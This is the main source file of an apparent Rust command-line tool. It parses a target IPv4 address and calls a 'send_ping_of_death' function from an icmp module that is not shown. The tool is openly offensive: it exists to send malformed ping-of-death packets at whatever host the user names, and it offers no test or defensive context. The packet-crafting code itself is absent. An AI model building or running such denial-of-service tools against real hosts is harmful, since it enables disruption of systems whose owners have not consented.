mod icmp;

use icmp::send_ping_of_death;

use std::{
    env,
    net::Ipv4Addr
};

fn main(){
    let args: Vec<String>  = env::args().collect();

    if args.len() != 2 {
        eprintln!("USAGE: cargo run <target_ip>");
        return;
    }

    let target_ip = match args[1].parse::<Ipv4Addr>() {
        Ok(ip) => ip,
        Err(error) => {
            eprintln!("[-]ERROR: Invalid IP Address.");
            return;
        }
    };

    match send_ping_of_death(target_ip) {
        Ok(_) => println!("Ping of Death send to {}", target_ip),
        Err(err) => eprintln!("[-]ERROR {}", err),
    }
}
